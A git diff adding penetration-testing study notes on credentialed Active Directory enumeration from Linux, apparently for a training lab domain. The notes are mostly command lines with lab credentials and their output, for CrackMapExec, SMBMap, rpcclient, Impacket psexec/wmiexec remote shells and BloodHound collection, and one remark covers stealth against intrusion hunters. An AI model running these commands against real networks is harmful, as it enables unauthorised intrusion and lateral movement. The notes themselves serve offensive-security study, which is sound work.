@@ -21,6 +21,15 @@
     - [AppLocker](#applocker)
     - [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
     - [LAPS](#laps)
+- [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
+    - [CrackMapExec](#crackmapexec)
+    - [SMBMap](#smbmap)
+    - [rpcclient](#rpcclient)
+    - [Impacket Toolkit](#impacket-toolkit)
+    - [Windapsearch](#windapsearch)
+    - [Bloodhound.py](#bloodhoundpy)
+
+
 
 
 
@@ -477,3 +486,245 @@ DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
 EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
 ```
 
+## Credentialed Enumeration - from Linux
+### CrackMapExec
+```bash
+# Domain User Enumeration
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395
+
+<SNIP>
+
+# Domain Group Enumeration
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0
+
+<SNIP>
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0
+
+# Logged On Users
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01
+
+<SNIP>
+
+# Share Enumeration - Domain Controller
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
+
+
+```
+
+- The module `spider_plus` will dig through each readable share on the host and list all readable files. 
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
+```
+
+### SMBMap
+
+```bash
+# SMBMap To Check Access
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Department Shares                                 	READ ONLY	
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+
+# Recursive List Of All Directories
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+
+```
+
+### rpcclient
+
+> [!NOTE]
+> The built-in Administrator account will always have the RID value Hex 0x1f4, or 500.
+
+```bash
+# SMB NULL Session with rpcclient
+rpcclient -U "" -N 172.16.5.5
+
+# RPCClient User Enumeration By RID
+rpcclient $> queryuser 0x457
+
+        User Name   :   htb-student
+        Full Name   :   Htb Student
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+
+# Enumdomusers
+rpcclient $> enumdomusers
+
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[lab_adm] rid:[0x3e9]
+user:[htb-student] rid:[0x457]
+user:[avazquez] rid:[0x458]
+user:[pfalcon] rid:[0x459]
+user:[fanthony] rid:[0x45a]
+user:[wdillard] rid:[0x45b]
+
+```
+
+### Impacket Toolkit
+- **Psexec.py**
+    - The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. 
+    - It then registers the service via RPC and the Windows Service Control Manager. 
+    - Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
+
+> [!NOTE]
+> To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
+
+```bash
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+
+
+```
+
+- **wmiexec.py**
+    - It does not drop any files or executables on the target host and generates fewer logs than other modules.
+    - After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). 
+    - This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems
+    - Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command.
+
+```bash
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+
+```
+
+### Windapsearch
+```bash
+# Domain Admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all Domain Admins
+[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]	Found 28 Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+<SNIP>
+
+# Privileged Users
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all AD privileged users
+[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 28 nested users for group Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Angela Dunn
+userPrincipalName: adunn@inlanefreight.local
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+```
+
+### Bloodhound.py
+- The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems or the [BloodHound.py collector](https://github.com/dirkjanm/BloodHound.py) (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files.
+- Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher/).
+
+```bash
+# Executing BloodHound.py
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 564 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 2951 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+INFO: Starting computer enumeration with 10 workers
+
+<SNIP>
+
+```
+
+- Once the script finishes, we will see the output files in the current working directory in the format of `<date_object.json>`.
+
+- **Upload the Zip File into the BloodHound GUI**
+    - We could then type sudo neo4j start to start the neo4j service, firing up the database we'll load the data into and also run Cypher queries against.
+    - Start bloodhound GUI, then upload the data.
+    - We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file.
+    - [BloodHound Cypher cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
